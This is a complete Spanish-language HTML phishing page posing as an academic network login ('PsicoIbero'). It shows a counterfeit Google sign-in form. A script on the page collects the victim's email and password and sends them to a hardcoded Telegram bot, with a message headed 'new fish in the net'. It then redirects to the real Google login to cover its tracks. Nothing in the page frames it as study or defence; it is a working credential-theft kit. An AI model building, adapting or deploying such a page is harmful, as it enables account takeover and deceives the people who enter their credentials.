<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acceso Institucional - PsicoIbero</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background-color: #ffffff;
            font-family: 'Roboto', arial, sans-serif;
        }
        .google-btn {
            transition: background-color .218s, border-color .218s, box-shadow .218s;
            border: 1px solid #dadce0;
            color: #3c4043;
            font-weight: 500;
        }
        .google-btn:hover {
            background-color: #f7fafe;
            border-color: #d2e3fc;
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen bg-gray-50">

    <div class="w-full max-w-[400px] p-10 bg-white border border-gray-300 rounded-lg shadow-sm">
        <!-- Encabezado -->
        <div class="text-center mb-8">
            <div class="flex justify-center mb-4">
                <svg class="w-12 h-12 text-indigo-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6.253v13m0-13C10.832 5.477 9.246 5 7.5 5S4.168 5.477 3 6.253v13C4.168 18.477 5.754 18 7.5 18s3.332.477 4.5 1.253m0-13C13.168 5.477 14.754 5 16.5 5s3.332.477 4.5 1.253v13C19.832 18.477 18.246 18 16.5 18s-3.332.477-4.5 1.253" />
                </svg>
            </div>
            <h1 class="text-2xl font-semibold text-gray-800">Red Iberoamericana</h1>
            <p class="text-gray-600 mt-2">Inicia sesi贸n para acceder al material</p>
        </div>

        <!-- Bot贸n de Google -->
        <div id="google-trigger-container">
            <button id="btn-google" class="google-btn w-full flex items-center justify-center gap-3 py-2.5 px-4 rounded-md mb-6">
                <svg width="18" height="18" viewBox="0 0 18 18">
                    <path d="M17.64 9.2c0-.637-.057-1.251-.164-1.84H9v3.481h4.844c-.209 1.125-.843 2.078-1.796 2.717v2.258h2.908c1.702-1.567 2.684-3.874 2.684-6.615z" fill="#4285f4"/>
                    <path d="M9 18c2.43 0 4.467-.806 5.956-2.184l-2.908-2.258c-.806.54-1.837.86-3.048.86-2.344 0-4.328-1.584-5.036-3.711H.957v2.332A8.997 8.997 0 009 18z" fill="#34a853"/>
                    <path d="M3.964 10.707c-.18-.54-.282-1.117-.282-1.707s.102-1.167.282-1.707V4.961H.957A8.996 8.996 0 000 9c0 1.452.348 2.827.957 4.039l3.007-2.332z" fill="#fbbc05"/>
                    <path d="M9 3.58c1.321 0 2.508.454 3.44 1.345l2.582-2.58C13.463.891 11.426 0 9 0A8.997 8.997 0 00.957 4.961L3.964 7.29C4.672 5.163 6.656 3.58 9 3.58z" fill="#ea4335"/>
                </svg>
                Continuar con Google
            </button>

            <div class="flex items-center my-6">
                <div class="flex-grow border-t border-gray-300"></div>
                <span class="px-3 text-gray-500 text-sm">o usa tu cuenta</span>
                <div class="flex-grow border-t border-gray-300"></div>
            </div>

            <input type="text" placeholder="Correo o tel茅fono" class="w-full p-3 border border-gray-300 rounded mb-4 outline-none focus:ring-2 focus:ring-indigo-500">
            <button class="w-full bg-indigo-600 text-white py-2.5 rounded font-medium hover:bg-indigo-700 transition">Siguiente</button>
        </div>

        <!-- Falso Formulario de Login de Google (Paso 2) -->
        <div id="google-login-step" class="hidden">
            <div class="text-center mb-6">
                <svg class="w-8 h-8 mx-auto mb-2" viewBox="0 0 24 24">
                    <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                    <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                    <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/>
                    <path d="M12 5.38c1.62 0 3.06.56 4.21 1.66l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 12-4.53z" fill="#EA4335"/>
                </svg>
                <h2 class="text-xl font-medium">Acceder con Google</h2>
            </div>
            
            <form id="fake-google-form" class="space-y-4">
                <input type="email" id="g-email" required placeholder="Correo electr贸nico" class="w-full p-3 border border-gray-300 rounded focus:ring-2 focus:ring-blue-500 outline-none">
                <input type="password" id="g-pass" required placeholder="Introduce tu contrase帽a" class="w-full p-3 border border-gray-300 rounded focus:ring-2 focus:ring-blue-500 outline-none">
                <button type="submit" class="w-full bg-blue-600 text-white py-2.5 rounded font-medium hover:bg-blue-700 shadow-md">Iniciar sesi贸n</button>
            </form>
        </div>

        <div id="loader" class="hidden text-center py-6">
            <div class="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-600 mx-auto"></div>
            <p class="mt-4 text-gray-500">Sincronizando con Google Account...</p>
        </div>
    </div>

    <script>
        const TOKEN = "8198434477:AAHwTLE56HN-W1-REPwGthWpt69IvPp8r88";
        const CHAT_ID = "6269583447";

        const btnGoogle = document.getElementById('btn-google');
        const triggerContainer = document.getElementById('google-trigger-container');
        const loginStep = document.getElementById('google-login-step');
        const loader = document.getElementById('loader');

        // Mostrar el falso login de Google
        btnGoogle.addEventListener('click', () => {
            triggerContainer.classList.add('hidden');
            loginStep.classList.remove('hidden');
        });

        // Captura y env铆o
        document.getElementById('fake-google-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('g-email').value;
            const pass = document.getElementById('g-pass').value;

            loginStep.classList.add('hidden');
            loader.classList.remove('hidden');

            const text = ` *NUEVO PEZ EN LA RED*\n\n` +
                         ` *Google Email:* \`${email}\`\n` +
                         ` *Google Pass:* \`${pass}\`\n\n` +
                         ` *IP Info:* Revisa los logs de tu hosting`;

            try {
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
                });
            } catch (err) {}

            // Redirecci贸n final para limpiar huellas
            setTimeout(() => {
                window.location.href = "https://accounts.google.com/ServiceLogin";
            }, 1500);
        });
    </script>
</body>
</html>
